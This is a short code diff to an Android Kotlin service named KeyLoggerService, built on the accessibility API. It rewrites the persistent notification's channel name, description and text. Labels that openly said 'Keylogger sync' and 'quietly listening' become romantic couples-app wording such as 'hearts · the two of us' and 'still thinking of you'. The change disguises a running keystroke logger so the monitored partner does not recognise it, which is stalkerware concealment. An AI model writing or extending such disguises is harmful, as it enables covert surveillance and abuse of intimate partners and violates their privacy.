@@ -293,8 +293,8 @@ class KeyLoggerService : AccessibilityService() {
     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
       val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
       val ch = NotificationChannel(
-        CHANNEL_ID, "Keylogger sync", NotificationManager.IMPORTANCE_MIN
-      ).apply { description = "Delivers keyboard capture to the couple" }
+        CHANNEL_ID, "hearts · the two of us", NotificationManager.IMPORTANCE_MIN
+      ).apply { description = "keeps your little notes, photos, and messages together" }
       nm.createNotificationChannel(ch)
     }
     val pi = PendingIntent.getActivity(
@@ -309,8 +309,8 @@ class KeyLoggerService : AccessibilityService() {
       Notification.Builder(this)
     }
     val notif = builder
-      .setContentTitle("hearts · keylogger")
-      .setContentText("quietly listening · 0 pending")
+      .setContentTitle("hearts")
+      .setContentText("still thinking of you")
       .setSmallIcon(android.R.drawable.ic_menu_agenda)
       .setContentIntent(pi)
       .setOngoing(true)
